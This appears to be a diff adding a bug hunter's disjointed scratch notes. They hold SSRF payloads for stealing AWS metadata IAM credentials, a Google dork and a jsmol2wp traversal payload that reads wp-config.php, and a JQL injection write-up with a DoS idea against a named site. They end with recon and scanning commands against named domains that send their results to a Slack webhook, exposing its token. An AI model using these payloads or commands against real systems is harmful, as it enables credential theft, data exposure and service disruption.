@@ -1,0 +1,76 @@
+APIPA SSRF
+
+AWS : http://169.254.169.254
+
+http://169.254.169.254/latest/user-data
+
+
+https://site.com/abc/dtc/user?uri=http://169.254.169.254/latest/user-data
+
+latest
+2021
+2020
+2019
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
+latest
+/meta-data
+/iam
+/security-credentials
+/flaws/
+
+
+unauth SSRF
+
+
+inurl:"/wp-content/plugins/jsmol2wp/php/"
+
+
+Payload: jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+
+
+
+
+
+
+site.com/image/user?profile=/url=169.254.169.254
+
+
+
+Hi team,
+
+
+I found JQL injection in https://wiki.eveoh.nl
+
+
+Description
+The JQL query in our case limits the data to one project and a specific (and rather short) time range (the current month). This restriction is hard-coded and should not change. However, a crafted user value allows us to remove this limitation:
+Martin Schneider' OR created < '2021-01-01
+Now the query becomes
+project = TeamA AND created > startOfMonth() AND assignee = 'Martin Schneider' OR created < '2021-01-01'
+will fetch all tickets from all projects of the entire JIRA instance!
+
+How to reproduce
+Go to https:// wiki.eveoh.nl /issues/?jql=
+in jql paramter put any heavy load crafted payload
+And perform attack  multiple times
+attack vector is to craft JQL queries with bad performance and thus long runtime. I didn’t explore this in detail, but it’s easy to imagine that queries using JQL functions, especially custom ones, can be designed to become quite expensive. JIRA has some safeguards in place, but this might still open an attack vector to perform DoS attacks by sending multiple such queries at the same time.
+
+image.png
+image.png
+Solution
+As a security threat, JQL injection is far from being on the same level as SQL injection. However, there are ways an attacker can exploit it. It is important to understand under which circumstances it poses a threat and how to prevent it.
+With security, having multiple layers of protection is a fundamental principle. In my opinion, input sanitisation should always be one of them.
+
+
+subfinder -d agri10x.com | httpx | slackcat -u https://hooks.slack.com/services/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
+
+nuclei -l msrc.txt -t cves/ | slackcat -u https://hooks.slack.com/services/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
+
+
+dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx -l agri10x.txt -i 200 --full-url -b domain.com
+
+dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx -d target.com -i 200 --full-url -b domain.com
+
+dirsearch.py -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx -l dd.txt -i 200 --full-url -b visual.ly
+
+
